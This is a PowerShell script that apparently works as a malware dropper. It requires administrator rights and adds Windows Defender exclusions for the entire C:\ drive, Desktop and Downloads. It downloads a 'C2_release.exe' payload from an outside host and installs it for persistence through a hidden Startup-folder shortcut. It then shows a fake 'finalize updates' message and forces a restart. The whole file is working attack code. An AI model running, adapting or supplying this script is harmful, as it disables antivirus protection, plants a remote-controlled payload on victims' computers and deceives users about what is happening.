
function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole($adminRole)
}

if (-not (Test-Administrator)) {
    Write-Error "This script must be run as Administrator"
    exit 1
}

# Function to find the path of C2.exe
function Find-C2Executable {
    param (
        [string]$fileName = "C2_release.exe"
    )
    $paths = Get-ChildItem -Path C:\ -Filter $fileName -Recurse -ErrorAction SilentlyContinue
    if ($paths.Count -gt 0) {
        return $paths[0].FullName
    } else {
        Write-Error "C2_release.exe not found"
        exit 1
    }
}

# Define the paths to exclude 
$pathToExclude = "C:\" 

$desktopPath = [System.IO.Path]::Combine($env:USERPROFILE, "Desktop")

$downloadsPath = [System.IO.Path]::Combine($env:USERPROFILE, "Downloads")

# Add the path to the Windows Defender exclusion list
Add-MpPreference -ExclusionPath $pathToExclude

Add-MpPreference -ExclusionPath $desktopPath

Add-MpPreference -ExclusionPath $downloadsPath

# Verify that the exclusion was added
$exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
if ($exclusions -contains $pathToExclude -and $exclusions -contains $desktopPath -and $exclusions -contains $downloadsPath) {
    
    #Invoke a web request to download malicious code
        Invoke-WebRequest -Uri http://malwinator.chickenkiller.com/download -Method POST -ContentType "application/x-www-form-urlencoded" -Body @{"file"="C2_release.exe"} -OutFile "C2_release.exe"

    # Define the path to Adobe Acrobat's executable file
	$progPath = Find-C2Executable

    # Define the path to the Startup folder
	$startupFolderPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")

# Define the path for the new shortcut
	$shortcutPath = [System.IO.Path]::Combine($startupFolderPath, "Yoink.lnk")

# Create a WScript.Shell COM object
	$wshShell = New-Object -ComObject WScript.Shell

# Create the shortcut
	$shortcut = $wshShell.CreateShortcut($shortcutPath)

# Set the target path for the shortcut
	$shortcut.TargetPath = $progPath 

# Save the shortcut
	$shortcut.Save()
# Make the icon a hidden item

	Set-ItemProperty -Path $progPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

# Path to the video file on the desktop
        $videoPath = [System.IO.Path]::Combine($env:USERPROFILE, "Desktop", "NiceComputer!.mp4")

# Check if the video file exists
#if (Test-Path $videoPath) {
    # Start the video using the default media player
#    Start-Process $videoPath
    #Write-Host "Playing video: $videoPath"
#} else {
#    Write-Error "Video file not found: $videoPath"
#}
    
    Write-Host "Cleanup complete. Restarting to finalize updates in a few seconds"
    #Write-Host "Successfully added paths to the exclusion list."
    Start-Sleep -Seconds 10
    Restart-Computer -Force
} else {
    Write-Error "Failed to add all paths to exclusion list"
}
